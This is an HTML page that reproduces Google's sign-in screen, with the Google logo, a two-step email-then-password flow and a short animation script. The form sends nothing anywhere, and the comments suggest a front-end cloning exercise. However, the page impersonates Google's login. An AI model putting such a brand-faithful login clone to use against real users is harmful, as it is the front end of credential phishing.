<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="style.css">
  <title>Google Login Form</title>
</head>

<body>

  <div class="box">
    <div class="loading-bar"></div>

    <!-- LOGO -->
    <div id="logo" class="google-logo" title="Google">
      <div class="rr0DNb">
        <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
          <g fill="none" fill-rule="evenodd">
            <path fill="#EA4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64z"/>
            <path fill="#34A853" d="M58.193.67h2.564v17.44h-2.564z"/>
            <path fill="#4285F4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858z"/>
            <path fill="#FBBC05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96z"/>
            <path fill="#EA4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96z"/>
            <path fill="#4285F4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"/>
          </g>
        </svg>
      </div>
    </div>

    <h2>Sign in</h2>
    <p>Use a Google account</p>

    <!-- FORM -->
    <form id="loginForm">

      <!-- STEP 1: EMAIL -->
      <div class="step step-email active">

        <div class="inputBox">
          <input
            type="email"
            id="email"
            required
            onkeyup="this.setAttribute('value', this.value);"
            value=""
          >
          <label>E-mail address or telephone number</label>
        </div>

        <div class="forgot">
          <button type="button">Forgot your address?</button>
        </div>

        <input type="button" value="Siguiente" onclick="goToPassword()">

      </div>

      <!-- STEP 2: PASSWORD -->
      <div class="step step-password">

        <p id="userEmail"></p>

        <div class="inputBox">
          <input
            type="password"
            id="password"
            required
            onkeyup="this.setAttribute('value', this.value);"
            value=""
          >
          <label>Password</label>
        </div>

        <input type="submit" value="Sign In">

      </div>

    </form>

  </div>

  <!-- JS -->
<script>
  function goToPassword() {
    const emailInput = document.getElementById('email');
    const email = emailInput.value.trim();

    if (!email) {
      emailInput.focus();
      return;
    }

    const stepEmail = document.querySelector('.step-email');
    const stepPassword = document.querySelector('.step-password');
    const loadingBar = document.querySelector('.loading-bar');

    document.getElementById('userEmail').textContent = email;

    // Mostrar loading
    loadingBar.classList.add('active');

    // Simular espera (Google style)
    setTimeout(() => {
      stepEmail.classList.add('exit');
    }, 200);

    setTimeout(() => {
      loadingBar.classList.remove('active');
      loadingBar.style.width = '0';

      stepEmail.classList.remove('active', 'exit');
      stepPassword.classList.add('active', 'enter');
    }, 650);
  }
</script>


</body>
</html>
